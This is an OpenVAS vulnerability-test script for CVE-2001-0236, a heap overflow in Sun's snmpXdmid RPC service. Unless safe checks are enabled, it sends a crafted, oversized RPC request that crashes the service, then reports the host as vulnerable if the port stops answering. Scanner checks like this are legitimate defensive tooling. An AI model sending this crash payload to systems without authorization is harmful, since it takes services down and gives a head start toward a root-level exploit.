# OpenVAS Vulnerability Test
# $Id: snmpXdmid.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: snmpXdmid overflow
#
# Authors:
# Intranode
#
# Copyright:
# Copyright (C) 2001 Intranode
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote RPC service 100249 (snmpXdmid) is vulnerable
to a heap overflow which allows any user to obtain a root
shell on this host.";

tag_solution = "disable this service (/etc/init.d/init.dmi stop) if you don't use
it, or contact Sun for a patch";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.10659");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_xref(name:"IAVA", value:"2001-a-0003");
 script_bugtraq_id(2417);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_tag(name:"qod_type", value:"remote_banner_unreliable");
 script_cve_id("CVE-2001-0236");
 
 name = "snmpXdmid overflow";
 
 script_name(name);
 
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 script_copyright("This script is Copyright (C) 2001 Intranode");
 family = "Gain a shell remotely";
 script_family(family);
 script_dependencies("secpod_rpc_portmap.nasl");
 script_require_keys("rpc/portmap");
 
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("global_settings.inc");
include("byte_func.inc");


port = get_rpc_port(program:100249, protocol:IPPROTO_TCP);
if(port)
{
  if(safe_checks())
  {
  data = " 
The remote RPC service 100249 (snmpXdmid) may be vulnerable
to a heap overflow which allows any user to obtain a root
shell on this host.

*** OpenVAS reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution: disable this service (/etc/init.d/init.dmi stop) if you don't use
it, or contact Sun for a patch";
  security_message(port:port, data:data);
  exit(0);
  }
  
  
  if(get_port_state(port))
  {
   soc = open_sock_tcp(port);
   if(soc)
   {
    #
    # We forge a bogus RPC request, with a way too long
    # argument. The remote process will die immediately,
    # and hopefully painlessly.
    #
    req = raw_string(0x00, 0x00, 0x0F, 0x9C, 0x22, 0x7D,
	  	  0x93, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x02, 0x00, 0x01, 0x87, 0x99, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x00, 0x20, 0x3A, 0xF1, 
		  0x28, 0x90, 0x00, 0x00, 0x00, 0x09, 0x6C, 0x6F,
		  0x63, 0x61, 0x6C, 0x68, 0x6F, 0x73, 0x74, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x01, 0x00, 0x00, 0x06, 0x44, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x00) +
		  crap(length:28000, data:raw_string(0x00));


     send(socket:soc, data:req);
     r = recv(socket:soc, length:4096);
     close(soc);
     sleep(1);
     soc2 = open_sock_tcp(port);
     if(!soc2)security_message(port);
     else close(soc2);
   }
 }
}
